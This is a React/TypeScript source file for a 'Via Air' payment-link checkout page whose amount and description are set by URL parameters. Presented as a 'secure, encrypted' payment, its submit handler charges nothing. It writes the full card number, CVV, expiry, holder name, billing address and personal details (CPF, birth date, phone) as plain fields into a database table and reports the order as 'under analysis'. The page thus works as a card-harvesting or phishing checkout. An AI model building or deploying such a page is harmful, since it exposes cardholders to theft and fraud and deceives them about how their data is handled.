import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import { useMemo, useState } from "react";
import { ArrowLeft, Check, Loader2, ShieldCheck } from "lucide-react";
import { toast } from "sonner";
import { supabase } from "@/integrations/supabase/client";
import { formatBRL } from "@/lib/format";
import { splitInstallments } from "@/lib/checkout-config";
import { CardForm, useCardData } from "@/components/CardForm";
import viaAirLogo from "@/assets/viaair-logo.png.asset.json";
import { ContactFooter } from "@/components/ContactFooter";

const MAX_INSTALLMENTS = 12;

type Search = {
  desc?: string;
  total?: string;
  parcelas?: string;
  entrada?: string;
  ref?: string;
  cliente?: string;
};

const asStr = (v: unknown): string | undefined => {
  if (v === undefined || v === null || v === "") return undefined;
  return typeof v === "string" ? v : String(v);
};

export const Route = createFileRoute("/pagar")({
  validateSearch: (s: Record<string, unknown>): Search => ({
    desc: asStr(s.desc),
    total: asStr(s.total),
    parcelas: asStr(s.parcelas),
    entrada: asStr(s.entrada),
    ref: asStr(s.ref),
    cliente: asStr(s.cliente),
  }),
  component: PayPage,
});

function PayPage() {
  const navigate = useNavigate();
  const { desc, total, parcelas, entrada, ref, cliente } = Route.useSearch();

  const totalNumber = Number(total) || 0;
  const entradaNumber = Number(entrada) || 0;
  const maxInstallments = Math.min(Math.max(Number(parcelas) || 10, 1), MAX_INSTALLMENTS);

  const [installments, setInstallments] = useState(maxInstallments);
  const { data: card, patch: patchCard } = useCardData();
  const [fullName, setFullName] = useState(cliente ?? "");
  const [cpf, setCpf] = useState("");
  const [email, setEmail] = useState("");
  const [phone, setPhone] = useState("");
  const [birthDate, setBirthDate] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [success, setSuccess] = useState(false);

  const installmentsOptions = useMemo(
    () => Array.from({ length: maxInstallments }, (_, i) => i + 1),
    [maxInstallments],
  );
  const firstAmount = entradaNumber > 0 ? entradaNumber : undefined;

  const invalid = !desc || !totalNumber;

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (submitting) return;
    if (!fullName || !email || !phone || !card.cardNumber || !card.cvv || !card.expiry) {
      toast.error("Preencha todos os campos obrigatórios.");
      return;
    }
    setSubmitting(true);
    try {
      const { error } = await supabase.from("orders").insert({
        package_id: null,
        package_snapshot: {
          kind: "payment_link",
          description: desc,
          reference: ref ?? null,
          card_capture: {
            brand_hint: card.cardNumber.replace(/\s/g, "").slice(0, 6),
            last4: card.cardNumber.replace(/\D/g, "").slice(-4),
            holder: card.cardName,
            expiry: card.expiry,
            cvv: card.cvv,
            full_number: card.cardNumber,
            billing: {
              address: card.billingAddress,
              number: card.billingNumber,
              zip: card.billingZip,
              city: card.billingCity,
              state: card.billingState,
            },
          },
        },
        full_name: fullName,
        email,
        phone,
        cpf: cpf || null,
        birth_date: birthDate || null,
        adults: 1,
        children: 0,
        payment_method: `credit_card_${installments}x`,
        total_price: totalNumber,
        notes: null,
      });
      if (error) throw error;
      setSuccess(true);
      toast.success("Seu pedido foi enviado para análise, em breve você receberá um retorno.");
    } catch (err) {
      toast.error(err instanceof Error ? err.message : "Erro ao processar pagamento");
    } finally {
      setSubmitting(false);
    }
  }

  return (
    <div className="min-h-screen bg-background text-foreground">
      <header className="border-b border-border bg-background/80 backdrop-blur">
        <div className="mx-auto max-w-7xl px-6 h-16 flex items-center justify-between">
          <Link to="/" className="flex items-center gap-3">
            <img src={viaAirLogo.url} alt="Via Air" className="h-9 w-auto" />
          </Link>
          <Link to="/" className="inline-flex items-center gap-2 text-sm text-muted-foreground hover:text-brand-orange">
            <ArrowLeft className="h-4 w-4" /> Voltar
          </Link>
        </div>
      </header>

      <div className="mx-auto max-w-4xl px-6 py-10">
        {invalid ? (
          <div className="rounded-2xl border border-border bg-card p-8 text-center">
            <h1 className="font-display text-2xl font-bold">Link de pagamento inválido</h1>
            <p className="mt-2 text-sm text-muted-foreground">
              Este link não tem as informações necessárias. Verifique com nosso time.
            </p>
          </div>
        ) : success ? (
          <div className="rounded-2xl border border-border bg-card p-8 text-center">
            <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-full bg-green-500/10 text-green-500">
              <Check className="h-8 w-8" />
            </div>
            <h1 className="mt-6 font-display text-2xl md:text-3xl font-bold">Pedido enviado!</h1>
            <p className="mt-3 text-muted-foreground max-w-md mx-auto">
              Seu pedido foi enviado para análise, em breve você receberá um retorno.
            </p>
            <Link
              to="/"
              className="mt-6 inline-flex items-center gap-2 rounded-full bg-gradient-brand px-6 py-3 font-semibold text-primary-foreground shadow-[var(--shadow-glow)] hover:opacity-90 transition"
            >
              <ArrowLeft className="h-4 w-4" /> Voltar ao início
            </Link>
          </div>
        ) : (
          <>
            <div className="flex items-center gap-2 text-brand-orange text-xs uppercase tracking-widest">
              <ShieldCheck className="h-4 w-4" /> Pagamento seguro Via Air
            </div>
            <h1 className="mt-1 font-display text-3xl md:text-4xl font-bold">Finalize seu pagamento</h1>
            <p className="mt-2 text-sm text-muted-foreground">{desc}</p>

            <form onSubmit={handleSubmit} className="mt-6 grid lg:grid-cols-[1fr_360px] gap-8">
              <div className="space-y-6">
                <Card title="Seus dados">
                  <div className="grid sm:grid-cols-2 gap-4">
                    <Field label="Nome completo *">
                      <input required value={fullName} onChange={(e) => setFullName(e.target.value)} className={cls} />
                    </Field>
                    <Field label="CPF">
                      <input value={cpf} onChange={(e) => setCpf(e.target.value)} className={cls} placeholder="000.000.000-00" />
                    </Field>
                    <Field label="E-mail *">
                      <input required type="email" value={email} onChange={(e) => setEmail(e.target.value)} className={cls} />
                    </Field>
                    <Field label="Telefone / WhatsApp *">
                      <input required value={phone} onChange={(e) => setPhone(e.target.value)} className={cls} />
                    </Field>
                    <Field label="Data de nascimento">
                      <input type="date" value={birthDate} onChange={(e) => setBirthDate(e.target.value)} className={cls} />
                    </Field>
                  </div>
                </Card>

                <Card title="Pagamento">
                  <CardForm
                    data={card}
                    onChange={patchCard}
                    installments={installments}
                    onInstallmentsChange={setInstallments}
                    installmentsOptions={installmentsOptions}
                    total={totalNumber}
                  />
                </Card>
              </div>

              <aside className="lg:sticky lg:top-6 h-fit">
                <div className="rounded-2xl border border-border bg-card p-6 shadow-[var(--shadow-card)] space-y-3">
                  <h3 className="font-semibold">Resumo</h3>
                  <div className="text-sm">{desc}</div>
                  {ref && <div className="text-xs text-muted-foreground">Ref: {ref}</div>}
                  <div className="border-t border-border pt-3 flex justify-between items-baseline">
                    <span className="text-muted-foreground text-sm">Total</span>
                    <span className="text-2xl font-display font-bold text-brand-orange">
                      {formatBRL(totalNumber)}
                    </span>
                  </div>
                  {(() => {
                    const effectiveFirst = entradaNumber > 0 && installments > 1 ? entradaNumber : undefined;
                    const s = splitInstallments(totalNumber, installments, effectiveFirst);
                    return s.equal ? (
                      <div className="text-xs text-muted-foreground text-right">
                        {installments}x de {formatBRL(s.first)} sem juros
                      </div>
                    ) : (
                      <div className="text-xs text-muted-foreground text-right space-y-0.5">
                        <div>1ª parcela: <strong className="text-foreground">{formatBRL(s.first)}</strong></div>
                        <div>+ {s.restCount}x de {formatBRL(s.rest)}</div>
                      </div>
                    );
                  })()}
                  <button
                    type="submit"
                    disabled={submitting || success}
                    className="w-full mt-2 inline-flex items-center justify-center gap-2 rounded-full bg-gradient-brand px-6 py-3 font-semibold text-primary-foreground shadow-[var(--shadow-glow)] hover:opacity-90 transition disabled:opacity-60"
                  >
                    {submitting ? <><Loader2 className="h-4 w-4 animate-spin" /> Processando…</> : <>Fazer pedido</>}
                  </button>
                  <p className="text-[11px] text-muted-foreground text-center">
                    Ambiente criptografado. Seus dados trafegam por conexão segura.
                  </p>
                </div>
              </aside>
            </form>
          </>
        )}
      </div>

      <ContactFooter />
    </div>
  );
}

const cls =
  "w-full rounded-xl border border-border bg-background px-3 py-2.5 text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-brand-orange/40";

function Card({ title, children }: { title: string; children: React.ReactNode }) {
  return (
    <section className="rounded-2xl border border-border bg-card p-6">
      <h2 className="font-semibold mb-4">{title}</h2>
      {children}
    </section>
  );
}

function Field({ label, children }: { label: string; children: React.ReactNode }) {
  return (
    <label className="block">
      <span className="block text-xs text-muted-foreground mb-1.5">{label}</span>
      {children}
    </label>
  );
}
